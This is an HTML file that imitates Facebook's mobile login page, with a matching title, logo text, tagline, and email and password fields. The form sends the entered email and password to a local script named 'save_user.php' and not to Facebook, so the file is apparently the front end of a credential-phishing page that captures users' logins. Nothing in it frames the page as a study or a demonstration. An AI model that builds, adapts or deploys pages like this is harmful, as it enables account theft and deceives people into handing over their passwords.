<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook – log in or sign up</title>
  <link rel="stylesheet" href="mobile.css" />
</head>
<body>
  <div class="container">
    <h1 class="logo">facebook</h1>
    <p class="tagline">Connect with friends and the world<br> around you on Facebook.</p>

    <form class="login-form" action="save_user.php" method="POST">
      <input type="text" name="email" placeholder="Email or phone number" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit" class="login-btn">Log In</button>
      <a href="#">Forgot password?</a>
      <div class="divider"></div>
      <button type="button" class="create-btn">Create new account</button>
    </form>


    <p class="footer">
      <strong>Create a Page</strong> for a celebrity, brand or business.
    </p>
  </div>
</body>
</html>
